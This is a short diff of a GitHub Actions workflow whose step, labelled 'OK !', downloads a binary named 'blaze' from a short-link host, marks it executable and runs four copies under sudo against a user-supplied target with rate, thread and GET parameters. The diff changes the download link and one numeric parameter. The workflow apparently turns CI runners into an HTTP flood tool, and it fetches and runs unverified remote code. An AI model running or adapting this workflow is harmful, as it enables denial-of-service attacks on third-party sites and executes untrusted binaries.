@@ -23,12 +23,12 @@ jobs:
       - name: OK !
         run: |
           TARGET="${{ inputs.target }}"
-          wget https://curl.by/OcB6A/blaze
+          wget https://curl.by/rWI9r/blaze
           chmod +x blaze
           
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 260 ./blaze "$TARGET" 250 12 4 GET 
+            sudo timeout 260 ./blaze "$TARGET" 250 3 4 GET
             PIDS+=($!)
           done
 
